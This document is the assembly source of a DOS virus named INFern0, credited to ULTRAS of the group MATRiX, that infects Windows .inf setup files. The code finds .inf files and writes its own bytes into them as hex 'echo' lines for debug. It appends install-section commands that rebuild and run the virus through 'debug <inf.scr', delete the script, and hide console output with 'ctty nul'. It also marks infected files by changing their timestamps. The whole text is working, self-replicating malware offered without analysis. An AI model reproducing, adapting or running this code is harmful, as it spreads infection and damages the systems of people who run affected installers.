comment *

INFern0 by ULTRAS[MATRiX]

Simple INF filez infector...

*


.model tiny
.radix 16
.code
org 100
start:
mov ah,4e
mov dx,offset htm_
find:        
int 21
jc exit
mov ax,3d02
mov dx,9e
int 21
jc findnext
xchg bx,ax
mov ax,5700
int 21
push cx dx
cmp dh,80
jae zaraza
mov ax,4202
xor cx,cx
xor dx,dx
int 21
mov si,100
mov di,offset end_virus
mov cx,end_virus-start
push bx
call @1
pop bx
call infect
pop dx
add dh,0c8
push dx
zaraza:
pop dx cx
mov ax,5701
int 21
mov ah,3e
int 21
findnext:
mov ah,4f
jmp find
exit:
mov ax,4c00
int 21
@1:
push cx
lodsb
mov bx,ax
mov cx,4
shr al,cl        
push ax
call @2
stosb
pop ax
shl al,cl
sub bl,al
xchg al,bl
call @2
stosb
mov ax,' '
stosb
pop cx
loop @1
stosb
stosb
ret
@2:
cmp al,0a
jae @3
add al,'0'
ret
@3:
add al,'A'-0a
ret
infect:
mov ah,40
mov dx,offset headerinf
mov cx,hendinf-headerinf
int 21
mov dx,offset end_virus
d_loop:
push dx        
call calcloc
call write_par     
pop dx        
push dx
mov cx,di
sub cx,dx
cmp cx,60d
jb write_d
mov cx,60d
write_d:
mov ah,40
int 21
push ax
mov dx,offset echodest
mov cx,evirusf-echodest
mov ah,40                   
int 21
pop ax
pop dx        
add dx,ax
cmp dx,di
jae write_zap
jmp d_loop
write_zap:
mov ah,40
mov dx,offset zap_vir
mov cx,end_zap-zap_vir
int 21
mov dx,offset endinf
mov cx,end_endinf-endinf
mov ah,40
int 21
ret
virii   db 'INFerno by ULTRAS'
write_par:
mov cx,enddb-databyte
jmp short ech_o
mov cx,5
ech_o:
mov dx,offset databyte
mov ah,40
int 21
ret
calcloc:
push ax bx cx dx si di
sub dx,offset end_virus
mov ax,dx
mov cx,3
xor dx,dx
div cx
mov dx,ax
add dx,100
mov di,offset hifr
mov si,offset location
xchg dh,dl
mov location,dx
mov cx,2
call @1
mov di,offset buffer
mov si,offset hifr
movsw
lodsb
movsw
pop di si dx cx bx ax
ret
htm_ db '*.inf',0
zap_vir:        
db 'CmdAdd = "echo" , "g >>inf.scr"',0dh,0a
db 'CmdAdd = "echo" , "q >>inf.scr"',0dh,0a
end_zap:
databyte db 'CmdAdd = "echo E'
buffer   db '0100 '
enddb:
echodest db ' >>'
virscr   db 'inf.scr"',0dh,0a
evirusf:
endinf:
db 'CmdAdd = "debug" , "<inf.scr"',0dh,0a
db 'CmdAdd = "del" , "inf.scr"',0dh,0a
db 'CmdAdd = "ctty" , "con"',0dh,0a
end_endinf:
headerinf:
db 0dh,0a,'[DefaultInstall]',0dh,0a
db 'CopyFiles = Ultra.File',0dh,0a
db 'UpdateAutoBat = Patch.It',0dh,0a
db 0dh,0a
db '[Patch.it]',0dh,0a
db 0dh,0a
db 'CmdAdd =  "ctty", "nul"',0dh,0a
hendinf:
location dw 0
hifr dw 0,0,0,0
end_virus:
end start
